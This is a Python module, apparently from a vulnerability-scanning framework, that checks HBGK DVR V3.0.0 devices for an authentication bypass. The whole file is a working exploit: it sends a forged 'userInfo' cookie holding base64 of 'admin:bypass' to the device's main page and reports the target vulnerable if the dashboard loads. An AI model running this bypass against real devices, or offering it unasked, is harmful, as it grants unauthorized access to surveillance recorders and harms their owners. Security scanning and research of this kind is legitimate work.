import httpx
import base64
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "hbgk_dvr_auth_bypass/device_rsp_scan"
        self.description = "HBGK DVR V3.0.0 Cookie Manipulation Authentication Bypass Scanner."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        print("\033[1;36m[*] Running verification script: hbgk_dvr_auth_bypass/device_rsp_scan...\033[0m")
        
        url = f"http://{target}:{port}/doc/page/main.asp" if not target.startswith(("http://", "https://")) else f"{target.rstrip('/')}/doc/page/main.asp"
        
        # Génération du payload de contournement logique (admin:bypass en base64)
        raw_credentials = b"admin:bypass"
        b64_payload = base64.b64encode(raw_credentials).decode('utf-8')
        
        # Format strict du cookie attendu par le firmware HBGK : userInfo[PORT]
        cookie_name = f"userInfo{port}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0",
            "Cookie": f"{cookie_name}={b64_payload}"
        }
        
        try:
            # allow_redirects=False pour capturer les refus d'accès (302) et valider uniquement l'accès direct (200)
            async with httpx.AsyncClient(timeout=6.0, verify=False, follow_redirects=False) as client:
                response = await client.get(url, headers=headers)
                
                if response.status_code == 200 and ("main" in response.text or "DVR" in response.text or response.text == ""):
                    return {
                        "vulnerable": True,
                        "details": f"Target is VULNERABLE. Bypassed authentication dashboard view using custom cookie header: '{cookie_name}'."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
